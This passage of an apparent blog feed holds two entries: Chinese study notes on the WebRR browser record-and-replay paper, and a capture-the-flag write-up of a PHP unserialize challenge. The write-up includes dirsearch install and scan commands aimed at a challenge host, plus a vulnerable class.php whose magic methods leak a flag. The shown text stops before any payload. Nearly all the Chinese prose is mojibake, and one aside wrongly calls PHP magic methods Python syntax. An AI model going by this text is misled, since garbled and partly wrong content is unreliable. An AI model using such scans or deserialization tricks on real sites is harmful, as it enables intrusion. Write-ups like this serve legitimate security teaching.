title="è®°å½•ï¼ˆrecordï¼‰"></a>è®°å½•ï¼ˆrecordï¼‰</h4><p>åœ¨è®°å½•ç¯èŠ‚ï¼ŒWebRRçš„ç­–ç•¥æ˜¯å°†JSæ‰§è¡Œåˆ’åˆ†ä¸ºä¸€äº›åˆ—JEUï¼ˆä¾‹å¦‚å½“è„šæœ¬æ’å…¥DOMæ—¶ï¼Œè§¦å‘äº‹ä»¶æˆ–æ‰§è¡Œå›è°ƒï¼‰</p><h5 id="scriptå•å…ƒ"><a href="#scriptå•å…ƒ" class="headerlink" title="scriptå•å…ƒ"></a>scriptå•å…ƒ</h5><p>åˆ’åˆ†æ–¹å¼ï¼šé€šè¿‡Hookæ–¹æ³•ï¼Œæ·»åŠ åˆ°Blinkä¸­ï¼Œä½¿ç”¨JS-Execution Uni Recorderæ¨¡å—åœ¨JEUå¼€å§‹å’Œç»“æŸæ—¶è®°å½•ï¼Œå…·ä½“è€Œè¨€ï¼Œåœ¨Blinkä¸­ï¼Œå½“ä¸€ä¸ªscriptæ ‡ç­¾è¢«æ’å…¥åˆ°DOMä¸­æ—¶ï¼Œå¯¹åº”é¡µé¢çš„ScriptControllerè¢«è°ƒç”¨ï¼Œè¯¥Controllerè°ƒç”¨V8æ¥æ‰§è¡Œç›¸å…³çš„è„šæœ¬ã€‚å…·ä½“æ¥è¯´ï¼ŒExecuteScriptAndReturnValueå°†è„šæœ¬ä¼ é€’ç»™V8è¿›è¡Œæ‰§è¡Œã€‚ä¸ºäº†è®°å½•è„šæœ¬æ‰§è¡Œï¼Œåœ¨Blinkå°†æ§åˆ¶æƒä¼ é€’ç»™V8çš„åœ°æ–¹æ’å…¥äº†hookã€‚å¯¹äºæ¯ä¸ªæ‰§è¡Œçš„è„šæœ¬ï¼ŒWEBRRè®°å½•äº†å¸§IDã€è„šæœ¬IDã€åºåˆ—å·ä»¥åŠè„šæœ¬æºä»£ç çš„å“ˆå¸Œå€¼ï¼Œä¸å¿…è®°å½•è„šæœ¬çš„æºä»£ç ï¼Œå› ä¸ºåœ¨è„šæœ¬çš„ç½‘ç»œè¯·æ±‚å‘èµ·æ—¶ï¼ŒBlink-Platform recording shimså°†ä¼šè®°å½•å®ƒã€‚</p><blockquote><p>Hook</p><p>å«åš <strong>é’©å­å‡½æ•°</strong>ï¼Œåœ¨ç³»ç»Ÿè°ƒç”¨ä¸€ä¸ªå‡½æ•°ä¹‹å‰ï¼Œé’©å­ç¨‹åºå°±å…ˆæ•è·è¯¥æ¶ˆæ¯ï¼Œå¾—åˆ°æ§åˆ¶æƒï¼Œè¿™æ—¶é’©å­ç¨‹åºæ—¢å¯ä»¥åŠ å·¥å¤„ç†ï¼ˆæ”¹å˜ï¼‰è¯¥å‡½æ•°çš„æ‰§è¡Œè¡Œä¸ºï¼Œè¿˜å¯ä»¥å¼ºåˆ¶ç»“æŸæ¶ˆæ¯çš„ä¼ é€’ã€‚</p><p>â€œBlink-Platform recording shimsâ€ </p><p>æ˜¯æŒ‡åœ¨æµè§ˆå™¨å¼•æ“ Blink ä¸­çš„ä¸€ç§æœºåˆ¶ï¼Œç”¨äºè®°å½•é¡µé¢åŠ è½½è¿‡ç¨‹ä¸­çš„å„ç§æ´»åŠ¨ï¼Œç‰¹åˆ«æ˜¯ç½‘ç»œè¯·æ±‚å’Œè„šæœ¬æ‰§è¡Œã€‚è¿™äº›è®°å½•æ˜¯ä¸ºäº†æ”¯æŒå¼€å‘è€…å·¥å…·ã€æ€§èƒ½åˆ†æä»¥åŠç±»ä¼¼çš„ç›®çš„ã€‚</p><p>ExecuteScriptAndReturnValue </p><p>æ˜¯ Blink æ¸²æŸ“å¼•æ“ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºæ‰§è¡Œ JavaScript è„šæœ¬å¹¶è¿”å›æ‰§è¡Œç»“æœçš„å€¼ã€‚</p></blockquote><h5 id="å›è°ƒå•å…ƒ"><a href="#å›è°ƒå•å…ƒ" class="headerlink" title="å›è°ƒå•å…ƒ"></a>å›è°ƒå•å…ƒ</h5><p>æ³¨å†Œå›è°ƒæœ€å¸¸ç”¨çš„ Web API åŒ…æ‹¬ setTimeout å’Œ setIntervalã€‚å½“è°ƒç”¨ setTimeout å’Œ setInterval æ—¶ï¼ŒBlink åˆ›å»ºä¸€ä¸ª DOMTimer å¯¹è±¡ã€‚è¯¥å¯¹è±¡å°è£…äº†å›è°ƒï¼ŒBlink å°†åœ¨æ¸²æŸ“çº¿ç¨‹ä¸Šå®‰æ’æ‰§è¡Œ DOMTimer::Executeï¼Œä»¥åœ¨æŒ‡å®šçš„æ—¶é—´åæ‰§è¡Œå›è°ƒã€‚ä¸ºäº†è®°å½•è¿™äº›å›è°ƒå•å…ƒï¼ŒWebRRåœ¨ DOMTimer::Execute å†…éƒ¨æ·»åŠ Hookï¼Œè®°å½•å›è°ƒçš„æ‰§è¡Œå¼€å§‹å’Œç»“æŸæ—¶é—´ã€‚<strong>è¿™æ˜¯ä¸ºäº†åœ¨åç»­çš„é‡æ”¾è¿‡ç¨‹ä¸­èƒ½å¤Ÿè¿˜åŸå›è°ƒå‡½æ•°çš„æ‰§è¡Œé¡ºåºå’Œæ—¶åºã€‚</strong></p><blockquote><p><code>setTimeout</code> ç”¨äºåœ¨æŒ‡å®šçš„å»¶è¿Ÿä¹‹åæ‰§è¡Œä¸€æ¬¡å›è°ƒå‡½æ•°ã€‚</p><p><code>setInterval</code> ç”¨äºåœ¨æ¯ä¸ªæŒ‡å®šçš„æ—¶é—´é—´éš”å†…é‡å¤æ‰§è¡Œå›è°ƒå‡½æ•°ã€‚</p><p><code>DOMTimer::Execute</code> æ˜¯åœ¨ Blink æ¸²æŸ“å¼•æ“ä¸­ç”¨äºæ‰§è¡Œå®šæ—¶å™¨ï¼ˆtimerï¼‰å›è°ƒçš„æ–¹æ³•ã€‚</p></blockquote><h5 id="äº‹ä»¶å•å…ƒ"><a href="#äº‹ä»¶å•å…ƒ" class="headerlink" title="äº‹ä»¶å•å…ƒ"></a>äº‹ä»¶å•å…ƒ</h5><p>ä¸ºäº†è®°å½•äº‹ä»¶ï¼ŒWebRRåœ¨ <code>EventTarget::FireEventListeners</code> ä¸­æ’å…¥é’©å­ï¼Œå¹¶è®°å½•é‡å»ºäº‹ä»¶æ‰€éœ€çš„å¿…è¦ä¿¡æ¯ã€‚</p><blockquote><p><code>EventTarget::FireEventListeners</code> è´Ÿè´£è§¦å‘ä¸ç‰¹å®šäº‹ä»¶ç›¸å…³è”çš„æ‰€æœ‰äº‹ä»¶ç›‘å¬å™¨ã€‚å…¶æ‰§è¡Œè¿‡ç¨‹åŒ…æ‹¬ä»¥ä¸‹æ­¥éª¤ï¼š</p><ol><li><strong>è·å–äº‹ä»¶ç±»å‹ï¼š</strong> ç¡®å®šè§¦å‘äº‹ä»¶ç›‘å¬å™¨çš„äº‹ä»¶ç±»å‹</li><li><strong>è·å–äº‹ä»¶ç›‘å¬å™¨åˆ—è¡¨ï¼š</strong> æŸ¥æ‰¾ä¸è¯¥äº‹ä»¶ç±»å‹ç›¸å…³è”çš„æ‰€æœ‰äº‹ä»¶ç›‘å¬å™¨åˆ—è¡¨</li><li><strong>é€ä¸€æ‰§è¡Œç›‘å¬å™¨ï¼š</strong> éå†äº‹ä»¶ç›‘å¬å™¨åˆ—è¡¨ï¼Œä¾æ¬¡æ‰§è¡Œæ¯ä¸ªç›‘å¬å™¨çš„å›è°ƒå‡½æ•°</li></ol></blockquote><h4 id="é‡æ”¾ï¼ˆreplayï¼‰"><a href="#é‡æ”¾ï¼ˆreplayï¼‰" class="headerlink" title="é‡æ”¾ï¼ˆreplayï¼‰"></a>é‡æ”¾ï¼ˆreplayï¼‰</h4><p><img src="/2024/02/02/WebRR/image-20240205212153130.png" alt="image-20240205212153130"></p><p>åœ¨é‡æ”¾è¿‡ç¨‹ä¸­ï¼Œæ“ä½œè¢«ä»é˜Ÿåˆ—ä¸­å–å‡ºï¼Œå¹¶ç”± Replay Dispatcher å®‰æ’åœ¨æ¸²æŸ“çº¿ç¨‹ä¸Šæ‰§è¡Œã€‚è¿™ä¸ªè¿‡ç¨‹ä¼šä¸€ç›´è¿›è¡Œï¼Œç›´åˆ°é˜Ÿåˆ—ä¸ºç©ºã€‚é¦–å…ˆï¼Œåœ¨é‡æ”¾å¼€å§‹æ—¶ï¼ŒWEBRR å°†å›æ”¾è°ƒåº¦ç¨‹åºå®‰æ’ä¸ºæ¸²æŸ“çº¿ç¨‹ä»»åŠ¡é˜Ÿåˆ—çš„ä¸€é¡¹ä»»åŠ¡ã€‚æ¥ä¸‹æ¥ï¼Œæ¸²æŸ“çº¿ç¨‹çš„è°ƒåº¦ç¨‹åºå°†æ‰§è¡Œå›æ”¾è°ƒåº¦ç¨‹åºä»»åŠ¡ã€‚å½“è¿™å‘ç”Ÿæ—¶ï¼Œè°ƒåº¦ç¨‹åºå°†ä»é˜Ÿåˆ—ä¸­å¼¹å‡ºä¸‹ä¸€ä¸ªé‡æ”¾æ“ä½œï¼Œå¤„ç†å®ƒï¼Œå¹¶åœ¨æ¸²æŸ“çº¿ç¨‹ä¸Šæ‰§è¡Œã€‚æ“ä½œå¦‚ä½•è¢«â€œå¤„ç†â€å–å†³äºä»é˜Ÿåˆ—ä¸­å¼¹å‡ºçš„é‡æ”¾æ“ä½œçš„ç±»å‹ã€‚æœ€åï¼Œåœ¨æ“ä½œå®Œæˆåï¼ŒWEBRR é€šè¿‡å°†è°ƒåº¦ç¨‹åºä»»åŠ¡æ”¾å›æ¸²æŸ“çº¿ç¨‹çš„ä»»åŠ¡é˜Ÿåˆ—ï¼Œé‡å¤è¿™ä¸ªè¿‡ç¨‹ï¼Œç›´åˆ°é‡æ”¾æ“ä½œé˜Ÿåˆ—ä¸ºç©ºã€‚</p><h5 id="JSreplayer"><a href="#JSreplayer" class="headerlink" title="JSreplayer"></a>JSreplayer</h5><p>è„šæœ¬æ³¨å†Œã€‚åœ¨ Blink ä¸­ï¼Œæ¯ä¸ª LocalFrame éƒ½å¼•ç”¨ä¸€ä¸ª ScriptRunner å¯¹è±¡å’Œä¸€ä¸ª ResourceFetcher å¯¹è±¡ã€‚ResourceFetcher ç±»ä»ç½‘ç»œä¸ºè¯¥å¸§ä¸‹è½½èµ„æºï¼Œè€Œ ScriptRunner å……å½“ ResourceFetcher ä¸æ¸²æŸ“çº¿ç¨‹è°ƒåº¦ç¨‹åºä¹‹é—´çš„ä¸­é—´äººã€‚ScriptRunner ç®¡ç†è„šæœ¬çš„çŠ¶æ€ï¼Œä½¿å…¶ä»æŒ‚èµ·çŠ¶æ€è¿‡æ¸¡åˆ°å°±ç»ªçŠ¶æ€ã€‚å½“è„šæœ¬å¤„äºâ€œæŒ‚èµ·â€çŠ¶æ€æ—¶ï¼ŒScriptRunner æ­£åœ¨ç­‰å¾… ResourceFetcher ä»ç½‘ç»œè·å–è¯¥è„šæœ¬çš„æºä»£ç ã€‚ä¸€æ—¦ ResourceFetcher å®Œæˆäº†è„šæœ¬çš„ä¸‹è½½ï¼Œè„šæœ¬å°†è¿‡æ¸¡åˆ°å°±ç»ªçŠ¶æ€ï¼Œç„¶åé€šçŸ¥ ScriptRunner åœ¨æ¸²æŸ“çº¿ç¨‹ä¸Šè°ƒåº¦è¯¥è„šæœ¬çš„æ‰§è¡Œã€‚åœ¨é‡æ”¾è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬åœ¨ ScriptRunner::NotifyScriptReady æ–¹æ³•ä¸­æ·»åŠ äº†æ³¨å†ŒæŒ‚é’©ï¼Œå¼ºåˆ¶æ‰€æœ‰å¤„äºå°±ç»ªçŠ¶æ€çš„è„šæœ¬åœ¨å…¶å¸§çš„ JSReplayer ä¸­æ³¨å†Œè‡ªå·±ã€‚</p><p>å›è°ƒæ³¨å†Œã€‚Web åº”ç”¨ç¨‹åºå¯ä»¥ä½¿ç”¨ <code>setTimeout</code> å’Œ <code>setInterval</code> ç­‰ API æ³¨å†Œå›è°ƒï¼Œä»¥åœ¨ç¨åçš„æ—¶é—´ç‚¹æ‰§è¡Œã€‚åœ¨ Blink å¼•æ“ä¸­ï¼Œå½“ä½¿ç”¨è¿™äº› API æ³¨å†Œå›è°ƒæ—¶ï¼Œå®ƒä¼šåˆ›å»ºä¸€ä¸ª <code>DOMTimer</code> å¯¹è±¡ï¼Œè¯¥å¯¹è±¡è´Ÿè´£æ‰§è¡Œæ­¤å›è°ƒã€‚åœ¨é‡æ”¾è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å¯¹å®šæ—¶å™¨çš„æ„é€ å‡½æ•°æ·»åŠ äº†æŒ‚é’©ï¼Œä»¥ä¾¿åœ¨åˆ›å»º <code>DOMTimer</code> æ—¶å°†å…¶æ³¨å†Œåˆ° <code>JSReplayer</code> ä¸­ã€‚WEBRR è¿˜é€šè¿‡ç±»ä¼¼çš„æ–¹æ³•æ”¯æŒå›æ”¾ä½¿ç”¨ <code>requestIdleCallback</code> å’Œ <code>requestAnimationFrame</code> æ³¨å†Œçš„å›è°ƒ</p><p>EventReplayer è´Ÿè´£é‡æ”¾ä¸äº‹ä»¶ç›¸å…³çš„é‡æ”¾æ“ä½œï¼Œå®ƒé€šè¿‡é‡å»ºåœ¨è®°å½•æœŸé—´å‘ç”Ÿçš„åŸå§‹äº‹ä»¶ï¼Œç„¶åå°†æ­¤äº‹ä»¶è§¦å‘åˆ°æ­£ç¡®çš„ EventTarget ä¸Šæ¥å®ç°ã€‚è¿™å°†è°ƒç”¨æ­¤äº‹ä»¶çš„ä»»ä½•äº‹ä»¶ä¾¦å¬å™¨ã€‚äº‹ä»¶çš„é‡å»ºæ˜¯é€šè¿‡ä½¿ç”¨é‡æ”¾æ“ä½œä¸­æä¾›çš„ä¿¡æ¯åˆ›å»ºä¸€ä¸ª Event å¯¹è±¡æ¥å®Œæˆçš„ã€‚å…·ä½“è€Œè¨€ï¼Œæ¯ä¸ªé‡æ”¾æ“ä½œåŒ…å«åˆ›å»º blink::Event ç±»æˆ–å…¶å­ç±»ï¼ˆä¾‹å¦‚ MouseEventã€KeyboardEvent ç­‰ï¼‰æ‰€éœ€çš„æ‰€æœ‰ä¿¡æ¯ã€‚</p><h5 id="ç»´æŠ¤DOMçŠ¶æ€"><a href="#ç»´æŠ¤DOMçŠ¶æ€" class="headerlink" title="ç»´æŠ¤DOMçŠ¶æ€"></a>ç»´æŠ¤DOMçŠ¶æ€</h5><p>åœ¨é‡æ”¾è¿‡ç¨‹ä¸­ï¼ŒWEBRR å¿…é¡»ç¡®ä¿åœ¨é‡æ”¾ JEU ä¹‹å‰ï¼ŒDOM çš„çŠ¶æ€ä¸è®°å½•æœŸé—´æ‰§è¡Œç›¸å…³ JEU ä¹‹å‰è§‚å¯Ÿåˆ°çš„çŠ¶æ€å®Œå…¨ç›¸åŒ¹é…ã€‚è¿™ç¡®ä¿äº†åœ¨é‡æ”¾æœŸé—´ï¼ŒJEU å°†è·å¾—ä¸è®°å½•é˜¶æ®µè§‚å¯Ÿåˆ°çš„ç›¸åŒè¾“å…¥ã€‚ä¸€ä¸ªä¸»è¦çš„æŒ‘æˆ˜æ˜¯æµè§ˆå™¨æ”¯æŒè¯¸å¦‚ async å’Œ defer ç­‰è„šæœ¬å±æ€§ï¼Œè¿™å…è®¸é¡µé¢çš„ HTML åœ¨è·å–èµ„æºçš„åŒæ—¶è¿›è¡Œè§£æï¼›è¿™æ˜¯åœ¨é‡æ”¾æœŸé—´å¯èƒ½äº§ç”Ÿçš„éç¡®å®šæ€§çš„ä¸€ä¸ªå¯èƒ½æ¥æºã€‚å› æ­¤ï¼Œä¸ºäº†å®ç°ç¡®å®šæ€§é‡æ”¾ï¼Œå¿…é¡»è·Ÿè¸ªå’Œè®°å½• DOM çš„çŠ¶æ€ã€‚ä¸ºæ­¤ï¼ŒWEBRR ä½¿ç”¨ DOM Recorder è®°å½•ç”±è§£æå™¨æ’å…¥ DOM æ ‘çš„æ“ä½œã€‚å¯¹äºæ¯ä¸ªæ’å…¥çš„ DOM èŠ‚ç‚¹ï¼Œæˆ‘ä»¬è®°å½•äº†åœ¨é‡æ”¾æœŸé—´æŒ‰æ­£ç¡®é¡ºåºé‡å»ºç›¸åŒ DOM æ ‘æ‰€éœ€çš„ä¿¡æ¯ã€‚åœ¨é‡æ”¾æœŸé—´ï¼Œä¸ºäº†ç¡®ä¿åœ¨æ‰§è¡Œ JEU ä¹‹å‰ DOM çš„çŠ¶æ€ä¸è®°å½•æœŸé—´ç›¸åŒï¼ŒWEBRR ç¦ç”¨äº† Blink çš„ HTML è§£æå™¨ï¼Œå¹¶ä½¿ç”¨è‡ªå®šä¹‰ DOMReplayer æ§åˆ¶ä½•æ—¶å°† DOM èŠ‚ç‚¹æ’å…¥åˆ°é¡µé¢æ–‡æ¡£ä¸­ï¼ˆè¯·æ³¨æ„ï¼Œåœ¨è®°å½•æœŸé—´ï¼ŒWEBRR ä¸æ›´æ”¹è§£æå™¨æˆ–é¡µé¢æ¸²æŸ“ï¼›æ›´æ”¹ä»…åœ¨é‡æ”¾æœŸé—´åº”ç”¨ï¼‰ã€‚DOMReplayer é¢ä¸´çš„ä¸»è¦æŒ‘æˆ˜æ˜¯ç¡®ä¿åœ¨æ‰§è¡Œ JEU ä¹‹å‰ï¼ŒDOM çš„çŠ¶æ€ä¸è®°å½•æœŸé—´ç›¸åŒã€‚ä¸ºäº†å®ç°è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬åˆ›å»ºäº†é¢å¤–çš„é‡æ”¾æ“ä½œæ¥è¡¨ç¤º DOM æ„é€ æ“ä½œã€‚ç„¶åï¼Œè¿™äº› DOM æ„é€ æ“ä½œè¢«æ”¾ç½®åœ¨ä¸ä¸ JEUs ç›¸å…³çš„é‡æ”¾æ“ä½œç›¸åŒçš„é‡æ”¾é˜Ÿåˆ—ä¸­ï¼Œä»¥ç¡®ä¿ DOM æ„é€ æ“ä½œåœ¨æ‰§è¡Œ JEU ä¹‹å‰å‘ç”Ÿã€‚</p><p>æˆ‘ä»¬åœ¨ BlinkPlatform å±‚å®ç°äº†è¿™ä¸ª shimï¼Œå› ä¸ºåº”ç”¨ç¨‹åºå‘å‡ºçš„æ‰€æœ‰ç½‘ç»œè¯·æ±‚éƒ½ç»è¿‡è¿™ä¸€å±‚ã€‚è¿™ä½¿æˆ‘ä»¬èƒ½å¤Ÿåˆ›å»ºä¸€ä¸ªå•ä¸€çš„è®°å½•æŒ‚é’©ï¼Œå¯ä»¥è®°å½•æ‰€æœ‰ç½‘ç»œå“åº”ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ReadPaper</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WebWriteUp3</title>
    <link href="/2024/02/01/WebWriteUp3/"/>
    <url>/2024/02/01/WebWriteUp3/</url>
    
    <content type="html"><![CDATA[<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><p><img src="/2024/02/01/WebWriteUp3/image-20240201102626049.png" alt="image-20240201102626049"></p><p>æç¤ºå¤‡ä»½ç½‘ç«™ï¼Œä½†æŸ¥çœ‹æºç ä¹‹åï¼Œæ²¡å‘ç°ä»€ä¹ˆæ–‡ä»¶</p><p>ï¼ˆæŸ¥çœ‹é¢˜è§£ï¼Œå­¦åˆ°äº†ä¸€ç§æ–°æ–¹æ³•ï¼‰</p><p>ä½¿ç”¨dirsearchå·¥å…·ï¼Œdirsearchæ˜¯ä¸€ä¸ªåŸºäºpython3çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œå¸¸ç”¨äºæš´åŠ›æ‰«æé¡µé¢ç»“æ„ï¼ŒåŒ…æ‹¬ç½‘é¡µä¸­çš„ç›®å½•å’Œæ–‡ä»¶ã€‚</p><p>å®‰è£…</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/maurosoria/</span>dirsearch.git<br>cd dirsearch<br>pip3 install -r requirements.txt<br></code></pre></td></tr></table></figure><p>æ‰«æï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> dirsearch.py -u http://<span class="hljs-number">5</span>d3554e3-<span class="hljs-number">9</span>f8d-<span class="hljs-number">4</span>fb2-a4d7-b045f1a58bd4.node5.buuoj.cn:<span class="hljs-number">81</span>/ -w db/dicc.txt<br></code></pre></td></tr></table></figure><p>æœ‰æ—¶å€™æ‰«ä¸å‡ºæ¥ï¼Œè¦å¤šæ‰«å‡ æ¬¡ï¼Œæœ€åèƒ½æ‰«å‡ºæ¥<a href="http://www.zip,å°†å…¶ä¸‹è½½ä¸‹æ¥/">www.zipï¼Œå°†å…¶ä¸‹è½½ä¸‹æ¥</a></p><p><img src="/2024/02/01/WebWriteUp3/image-20240201122605748.png" alt="image-20240201122605748"></p><p>flag</p><p>åœ¨index.phpä¸­å¯ä»¥çœ‹åˆ°ï¼š</p><p><img src="/2024/02/01/WebWriteUp3/image-20240201152917397.png" alt="image-20240201152917397"></p><p>å¼•å…¥class.php,,é€šè¿‡<code>$_GET[&#39;select&#39;]</code>è·å–äº†ç”¨æˆ·ä¼ é€’çš„å‚æ•°ï¼Œç„¶åä½¿ç”¨<code>unserialize</code>å°è¯•å°†è¿™ä¸ªå‚æ•°ååºåˆ—åŒ–æˆå¯¹è±¡, <code>@</code>ç¬¦å·æ¥æŠ‘åˆ¶å¯èƒ½çš„ååºåˆ—åŒ–é”™è¯¯ã€‚</p><p><strong>åºåˆ—åŒ–ä¸ååºåˆ—åŒ–</strong></p><p><img src="/2024/02/01/WebWriteUp3/image-20240201160604920.png" alt="image-20240201160604920"></p><p>åºåˆ—åŒ–ç»“æœç»“æ„ï¼š</p><p>O:å¯¹è±¡åçš„é•¿åº¦:â€å¯¹è±¡åâ€:å¯¹è±¡å±æ€§ä¸ªæ•°:{s:å±æ€§åçš„é•¿åº¦:â€å±æ€§åâ€;s:å±æ€§å€¼çš„é•¿åº¦:â€å±æ€§å€¼â€;}</p><p>é‚£ä¹ˆé¦–å…ˆå¯¹è±¡é•¿åº¦ä¸º6ï¼Œåç§°ä¸ºclass1ï¼Œå±æ€§ä¸ªæ•°ä¸º3</p><p>å¯¹äºaï¼šå±æ€§ä¸ºpublicï¼Œ1è¡¨ç¤ºå˜é‡åé•¿åº¦ï¼Œaä¸ºå˜é‡å</p><p>å¯¹äºbï¼šå±æ€§ä¸ºprotectedï¼Œå˜é‡åé•¿åº¦ä¸º4ï¼ˆbå‰æ·»åŠ äº†%00*%00ï¼‰</p><p>å¯¹äºcï¼šå±æ€§ä¸ºprivateï¼Œå˜é‡é•¿åº¦ä¸º9ï¼Œå› ä¸ºè¡¨ç¤ºprivateçš„æ–¹å¼æ˜¯ï¼š%00ç±»å%00å˜é‡å</p><p>å¯¹äºç±»ä¸­å£°æ˜çš„æ–¹æ³•ï¼Œåºåˆ—åŒ–å¹¶ä¸ä¼šä¿å­˜ä¸‹æ¥</p><p>ååºåˆ—åŒ–ï¼š</p><p><img src="/2024/02/01/WebWriteUp3/image-20240201161815441.png" alt="image-20240201161815441"></p><p><img src="/2024/02/01/WebWriteUp3/image-20240201161834973.png" alt="image-20240201161834973"></p><p><img src="/2024/02/01/WebWriteUp3/image-20240201161858789.png" alt="image-20240201161858789"></p><p>ååºåˆ—åŒ–åªèƒ½è¾“å‡ºpublicå˜é‡</p><p>class.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;nonono&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;yesyes&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;password != <span class="hljs-number">100</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You name is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;username;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You password is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;password;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;username === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;<br>            <span class="hljs-keyword">die</span>();<br><br>            <br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>é­”æœ¯æ–¹æ³•ï¼ˆMagic Methodsï¼‰</p><p>æ‰€è°“é­”æœ¯æ–¹æ³•ï¼ˆMagic Methodsï¼‰ï¼Œæ˜¯Pythonçš„ä¸€ç§é«˜çº§è¯­æ³•ï¼Œå…è®¸ä½ åœ¨ç±»ä¸­è‡ªå®šä¹‰å‡½æ•°ï¼ˆå‡½æ•°åæ ¼å¼ä¸€èˆ¬ä¸º__xx__ï¼‰ï¼Œå¹¶ç»‘å®šåˆ°ç±»çš„ç‰¹æ®Šæ–¹æ³•ä¸­ã€‚æ¯”å¦‚åœ¨ç±»Aä¸­è‡ªå®šä¹‰__str__()å‡½æ•°ï¼Œåˆ™åœ¨è°ƒç”¨str(A())æ—¶ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨__str__()å‡½æ•°ï¼Œå¹¶è¿”å›ç›¸åº”çš„ç»“æœã€‚</p></blockquote><p>å…¶ä¸­çš„wakeupå’Œdestructéƒ½æ˜¯é­”æœ¯æ–¹æ³•ï¼Œ</p><ul><li>__construct():å…·æœ‰æ„é€ å‡½æ•°çš„ç±»ä¼šåœ¨æ¯æ¬¡åˆ›å»ºæ–°å¯¹è±¡æ—¶å…ˆè°ƒç”¨æ­¤æ–¹æ³•ã€‚</li><li>__destruct():ææ„å‡½æ•°ä¼šåœ¨åˆ°æŸä¸ªå¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨éƒ½è¢«åˆ é™¤æˆ–è€…å½“å¯¹è±¡è¢«æ˜¾å¼é”€æ¯æ—¶æ‰§è¡Œã€‚</li><li>__sleep()æ–¹æ³•åœ¨ä¸€ä¸ªå¯¹è±¡è¢«åºåˆ—åŒ–ä¹‹å‰è°ƒç”¨ï¼›</li><li>__wakeup():unserialize( )ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ª__wakeup( 